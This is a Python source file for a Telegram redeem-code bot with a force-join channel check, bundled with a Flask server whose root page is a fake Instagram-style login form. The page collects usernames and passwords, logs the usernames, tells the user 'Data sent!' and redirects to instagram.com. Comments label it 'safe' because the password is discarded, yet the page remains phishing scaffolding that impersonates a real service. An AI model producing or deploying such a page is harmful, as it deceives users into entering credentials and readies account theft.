# bot_with_redeem_and_login_form_safe.py
import os
import random
import string
import logging
import time
import asyncio
from threading import Thread
from typing import Set, Optional, Dict, Any, Tuple

from flask import Flask, jsonify, request, Response
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram.error import Forbidden, BadRequest
from telegram.constants import ParseMode  # For HTML parse mode

# ---------- Configuration ----------
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip().isdigit()]
FORCE_JOIN_CHANNEL = os.getenv("FORCE_JOIN_CHANNEL")  # e.g. @mychannel or numeric id
WEB_SECRET = os.getenv("WEB_SECRET", "")  # secret token for protected HTTP endpoints (restart/open)
BOT_VERSION = os.getenv("BOT_VERSION", "v1.0")

if not BOT_TOKEN or not FORCE_JOIN_CHANNEL:
    raise ValueError("Missing BOT_TOKEN or FORCE_JOIN_CHANNEL environment variables!")

# ---------- Logging ----------
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ---------- Runtime state ----------
codes: Dict[str, Dict[str, Any]] = {}  # in-memory codes store
_start_time = time.time()

# ---------- Force-join cache (to reduce API calls) ----------
_force_cache: Dict[int, Tuple[bool, float]] = {}
_FORCE_CACHE_TTL = 45.0  # seconds
_force_cache_lock = asyncio.Lock()

# ---------- Helpers ----------
def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

def generate_random_code(length=8) -> str:
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choices(chars, k=length))

def format_uptime(seconds: float) -> str:
    s = int(seconds)
    hours = s // 3600
    mins = (s % 3600) // 60
    secs = s % 60
    if hours:
        return f"{hours}h {mins}m {secs}s"
    if mins:
        return f"{mins}m {secs}s"
    return f"{secs}s"

def compute_active_users() -> int:
    users: Set[int] = set()
    for info in codes.values():
        used_by = info.get("used_by")
        if isinstance(used_by, list):
            users.update(used_by)
        elif isinstance(used_by, int):
            users.add(used_by)
    return len(users)

async def _get_cached_force_status(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    if is_admin(user_id):
        return True

    now = time.time()
    cached = _force_cache.get(user_id)
    if cached and cached[1] > now:
        return cached[0]

    async with _force_cache_lock:
        cached = _force_cache.get(user_id)
        if cached and cached[1] > now:
            return cached[0]
        try:
            member = await context.bot.get_chat_member(FORCE_JOIN_CHANNEL, user_id)
            is_member = member.status in ("member", "administrator", "creator")
        except BadRequest:
            is_member = False
        except Forbidden:
            is_member = False
        except Exception:
            logger.exception("Unexpected error checking chat member")
            is_member = False

        _force_cache[user_id] = (is_member, now + _FORCE_CACHE_TTL)
        return is_member

async def ensure_force_join_or_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    if not update.effective_user:
        return False
    user_id = update.effective_user.id
    if is_admin(user_id):
        return True

    is_member = await _get_cached_force_status(user_id, context)
    if is_member:
        return True

    join_button = InlineKeyboardMarkup(
        [[InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{FORCE_JOIN_CHANNEL.lstrip('@')}")]]
    )
    try:
        if update.message:
            await update.message.reply_text(
                "⚠️ <b>You must join our channel to use this bot.</b>\n\n"
                "Tap the button below to join and then retry the command.",
                reply_markup=join_button,
                parse_mode=ParseMode.HTML
            )
        elif update.callback_query:
            await update.callback_query.answer()
            await update.callback_query.message.reply_text(
                "⚠️ <b>You must join our channel to use this bot.</b>\n\n"
                "Tap the button below to join and then retry the action.",
                reply_markup=join_button,
                parse_mode=ParseMode.HTML
            )
    except Exception:
        logger.exception("Failed to send force-join prompt to user")
    return False

# ---------- Telegram Handlers ----------
start_message_user = (
    "👋 <b>Welcome to the Redeem Code Bot!</b>\n\n"
    "<b>Use the command below to redeem your code:</b>\n\n"
    "<code>/redeem &lt;code&gt;</code>\n\n"
    "Enjoy! 🤍"
)

start_message_admin = (
    "👋 <b>Welcome to the Redeem Code Bot!</b>\n\n"
    "<b>Use the command below to manage codes:</b>\n\n"
    "<code>/redeem &lt;code&gt;</code>\n\n"
    "<b>YOU ARE AN ADMIN OF THIS BOT 💗</b>\n"
    "<b>You can access commands 👇</b>"
)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message:
        return
    if is_admin(update.effective_user.id):
        keyboard = InlineKeyboardMarkup(
            [[InlineKeyboardButton("📜 Commands", callback_data="show_commands")]]
        )
        await update.message.reply_text(
            start_message_admin,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
    else:
        ok = await ensure_force_join_or_prompt(update, context)
        if not ok:
            return
        await update.message.reply_text(start_message_user, parse_mode=ParseMode.HTML)

async def show_commands_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    commands_text = (
        "🛠 <b>Admin Commands:</b>\n\n"
        "<code>/generate &lt;code&gt; &lt;optional message&gt;</code> — One-time code\n"
        "<code>/generate_multi &lt;code&gt; &lt;limit&gt; &lt;optional message&gt;</code> — Multi-use code\n"
        "<code>/generate_random &lt;optional message&gt;</code> — Random one-time\n"
        "<code>/redeem &lt;code&gt;</code> — Redeem a code\n"
        "<code>/listcodes</code> — List all codes\n"
        "<code>/deletecode &lt;code&gt;</code> — Delete a code\n"
        "<code>/ping</code> — System ping (latency + uptime)"
    )
    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="back_to_start")]])
    await query.edit_message_text(text=commands_text, parse_mode=ParseMode.HTML, reply_markup=keyboard)

async def back_to_start_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("📜 Commands", callback_data="show_commands")]])
    await query.edit_message_text(text=start_message_admin, parse_mode=ParseMode.HTML, reply_markup=keyboard)

# ---------- Code Commands ----------
async def generate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message:
        return
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ You are not authorized to use this command.", parse_mode=ParseMode.HTML)
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /generate <code> <optional message>", parse_mode=ParseMode.HTML)
        return
    code = args[0].upper()
    message = " ".join(args[1:]) if len(args) > 1 else ""
    if code in codes:
        await update.message.reply_text("❌ That code already exists.", parse_mode=ParseMode.HTML)
        return
    codes[code] = {
        "limit": 1,
        "uses": 0,
        "message": message,
        "created_by": update.effective_user.id,
        "used_by": []
    }
    await update.message.reply_text(f"✅ Code <b>{code}</b> created (one-time).\nMessage: {message or '(none)'}", parse_mode=ParseMode.HTML)

async def generate_multi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message:
        return
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ You are not authorized to use this command.", parse_mode=ParseMode.HTML)
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /generate_multi <code> <limit> <optional message>", parse_mode=ParseMode.HTML)
        return
    code = args[0].upper()
    try:
        limit = int(args[1])
        if limit < 1:
            raise ValueError()
    except ValueError:
        await update.message.reply_text("Limit must be a positive integer.", parse_mode=ParseMode.HTML)
        return
    message = " ".join(args[2:]) if len(args) > 2 else ""
    if code in codes:
        await update.message.reply_text("❌ That code already exists.", parse_mode=ParseMode.HTML)
        return
    codes[code] = {
        "limit": limit,
        "uses": 0,
        "message": message,
        "created_by": update.effective_user.id,
        "used_by": []
    }
    await update.message.reply_text(f"✅ Code <b>{code}</b> created (multi-use, limit {limit}).\nMessage: {message or '(none)'}", parse_mode=ParseMode.HTML)

async def generate_random(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message:
        return
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ You are not authorized to use this command.", parse_mode=ParseMode.HTML)
        return
    message = " ".join(context.args) if context.args else ""
    for _ in range(10):
        code = generate_random_code(8)
        if code not in codes:
            break
    else:
        await update.message.reply_text("❌ Unable to generate unique code. Try again.", parse_mode=ParseMode.HTML)
        return
    codes[code] = {
        "limit": 1,
        "uses": 0,
        "message": message,
        "created_by": update.effective_user.id,
        "used_by": []
    }
    await update.message.reply_text(f"✅ Random code <b>{code}</b> created (one-time).\nMessage: {message or '(none)'}", parse_mode=ParseMode.HTML)

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message:
        return
    ok = await ensure_force_join_or_prompt(update, context)
    if not ok:
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /redeem <code>", parse_mode=ParseMode.HTML)
        return
    code = args[0].upper()
    info = codes.get(code)
    if not info:
        await update.message.reply_text("❌ Invalid code.", parse_mode=ParseMode.HTML)
        return
    user_id = update.effective_user.id
    if info["uses"] >= info["limit"]:
        await update.message.reply_text("❌ Code already redeemed / limit reached.", parse_mode=ParseMode.HTML)
        return
    info["uses"] += 1
    if isinstance(info.get("used_by"), list):
        info["used_by"].append(user_id)
    else:
        info["used_by"] = [user_id]
    await update.message.reply_text(f"✅ Code <b>{code}</b> redeemed!\n{info['message'] or ''}", parse_mode=ParseMode.HTML)

async def listcodes(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message:
        return
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ You are not authorized to use this command.", parse_mode=ParseMode.HTML)
        return
    if not codes:
        await update.message.reply_text("No codes present.", parse_mode=ParseMode.HTML)
        return
    lines = []
    for code, info in codes.items():
        lines.append(f"<b>{code}</b> — uses {info['uses']}/{info['limit']} — message: {info['message'] or '(none)'}")
    text = "📜 <b>Codes:</b>\n\n" + "\n".join(lines)
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

async def deletecode(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message:
        return
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ You are not authorized to use this command.", parse_mode=ParseMode.HTML)
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /deletecode <code>", parse_mode=ParseMode.HTML)
        return
    code = args[0].upper()
    if code not in codes:
        await update.message.reply_text("❌ Code not found.", parse_mode=ParseMode.HTML)
        return
    del codes[code]
    await update.message.reply_text(f"✅ Code <b>{code}</b> deleted.", parse_mode=ParseMode.HTML)

# ---------- Styled Ping ----------
async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not update.message:
            return
        start = time.perf_counter()
        sent = await update.message.reply_text("🏓 Pinging...")
        elapsed = (time.perf_counter() - start) * 1000  # ms

        if elapsed < 150:
            status = "Excellent ⚡"
        elif elapsed < 300:
            status = "Good ✅"
        elif elapsed < 600:
            status = "Moderate ⚠️"
        else:
            status = "Poor ❌"

        uptime = format_uptime(time.time() - _start_time)
        response_ms = f"{int(elapsed)} ms"

        text = (
            "<code>[ SYSTEM PING ]</code>\n\n"
            f"<code>≡ Response : {response_ms}</code>\n"
            f"<code>≡ Status   : {status}</code>\n"
            f"<code>≡ Uptime   : {uptime}</code>"
        )

        await sent.edit_text(text, parse_mode=ParseMode.HTML)
    except Exception:
        logger.exception("/ping failed")
        if update.message:
            await update.message.reply_text("⚠️ Unable to measure ping right now.")

# ---------- Flask ----------
flask_app = Flask(__name__)

# Updated HTML: logo, login form
LOGIN_FORM_HTML = r"""
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>User Login</title>
  <style>
    body { background: #fafafa; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
    .container { width: 350px; background: #fff; border: 1px solid #dbdbdb; padding: 40px; text-align: center; border-radius:8px; box-shadow: 0 2px 6px rgba(0,0,0,0.04);}
    .logo { width: 120px; margin-bottom: 20px; }
    input { width: 100%; padding: 10px; margin: 6px 0; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; }
    .login-btn { width: 100%; background: #0095f6; color: #fff; padding: 10px; border: none; border-radius: 3px; font-weight: bold; cursor: pointer; margin-top: 10px; }
    small.note { display:block; margin-top:10px; color:#666; font-size:13px; }
  </style>
</head>
<body>
  <div class="container">
    <!-- example logo (replace with your static /static/logo.png if you wish) -->
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="App Logo" class="logo">
    <h2>🔐 User Login</h2>
    <form method="POST" action="/submit_form">
      <input type="text" name="username" placeholder="Username" required>
      <input type="password" name="password" placeholder="Password" required>
      <button class="login-btn" type="submit">Log In</button>
      <small class="note">By logging in you agree to the terms of service.</small>
    </form>
  </div>
</body>
</html>
"""

@flask_app.route("/")
def home():
    return Response(LOGIN_FORM_HTML, mimetype="text/html")

# Success page HTML template with countdown and redirect (safe: does NOT send credentials)
SUCCESS_HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Login Success</title>
  <style>
    body { background: #fafafa; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
    .container { width: 350px; background: #fff; border: 1px solid #dbdbdb; padding: 40px; text-align: center; border-radius:8px; box-shadow: 0 2px 6px rgba(0,0,0,0.04);}
    .logo { width: 120px; margin-bottom: 20px; }
    h3 { color: green; margin-bottom: 6px; }
    p { margin: 6px 0; color: #333; }
    .count { font-weight: bold; font-size: 18px; color: #222; margin-top:10px; }
  </style>
  <script>
    // JS countdown and redirect
    let seconds = 5;
    function tick() {
      const el = document.getElementById('countdown');
      if (!el) return;
      el.textContent = seconds;
      if (seconds <= 0) {
        window.location.href = "https://www.instagram.com";
      } else {
        seconds -= 1;
        setTimeout(tick, 1000);
      }
    }
    window.addEventListener('DOMContentLoaded', (event) => {
      tick();
    });
  </script>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="App Logo" class="logo">
    <h3>✅ Data sent!</h3>
    <p>You will be redirected to Instagram in <span id="countdown" class="count">5</span> seconds.</p>
    <p>If you are not redirected automatically, <a href="https://www.instagram.com">click here</a>.</p>
  </div>
</body>
</html>
"""

@flask_app.route("/submit_form", methods=["POST"])
def submit_form():
    """
    SAFE behavior:
      - This function intentionally does NOT forward or store passwords.
      - It returns a styled success page with a countdown and redirect to instagram.com.
    If you need to implement a legitimate login flow, use Instagram's OAuth (Basic Display / Facebook Login).
    """
    username = request.form.get("username", "")
    # NOTE: we do NOT store or forward the password. We purposely ignore it for safety.
    # If you have a legitimate use-case to collect data, implement proper consent & secure storage.
    logger.info("Login form submitted (username received): %s", username)

    # Return the styled success page with countdown (safe)
    return Response(SUCCESS_HTML_TEMPLATE, mimetype="text/html")

# ---------- Status + placeholders ----------
@flask_app.route("/status")
def status():
    uptime = format_uptime(time.time() - _start_time)
    active_users = compute_active_users()
    return jsonify({
        "uptime": uptime,
        "version": BOT_VERSION,
        "active_users": active_users,
        "force_channel": FORCE_JOIN_CHANNEL,
        "bot_name": "Redeem Code Bot",
        "codes_count": len(codes)
    })

def _check_secret(req_json):
    if not WEB_SECRET:
        return False
    return req_json.get("secret") == WEB_SECRET

@flask_app.route("/restart", methods=["POST"])
def http_restart():
    data = request.get_json(silent=True) or {}
    if not _check_secret(data):
        return jsonify({"ok": False, "message": "unauthorized"}), 401
    logger.info("Received /restart via HTTP - secret validated (no restart performed).")
    return jsonify({"ok": True, "message": "restart endpoint placeholder."}), 200

@flask_app.route("/open", methods=["POST"])
def http_open():
    data = request.get_json(silent=True) or {}
    if not _check_secret(data):
        return jsonify({"ok": False, "message": "unauthorized"}), 401
    logger.info("Received /open via HTTP - secret validated (placeholder).")
    return jsonify({"ok": True, "message": "open endpoint placeholder."}), 200

def run_flask():
    port = int(os.getenv("PORT", "5000"))
    flask_app.run(host="0.0.0.0", port=port, threaded=True)

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    # Attach bot + app to Flask (used by other endpoints)
    flask_app.bot = app.bot
    flask_app.telegram_app = app

    # Save current loop so other threads can schedule tasks safely
    try:
        flask_app.telegram_loop = asyncio.get_event_loop()
        logger.info("Saved current asyncio loop for flask_app.telegram_loop")
    except Exception:
        flask_app.telegram_loop = None
        logger.info("Could not capture event loop; fallback scheduling may be used")

    # Register handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(show_commands_callback, pattern="show_commands"))
    app.add_handler(CallbackQueryHandler(back_to_start_callback, pattern="back_to_start"))
    app.add_handler(CommandHandler("generate", generate))
    app.add_handler(CommandHandler("generate_multi", generate_multi))
    app.add_handler(CommandHandler("generate_random", generate_random))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("listcodes", listcodes))
    app.add_handler(CommandHandler("deletecode", deletecode))
    app.add_handler(CommandHandler("ping", ping))

    Thread(target=run_flask, daemon=True).start()
    logger.info("Bot is starting...")
    app.run_polling()

if __name__ == "__main__":
    main()
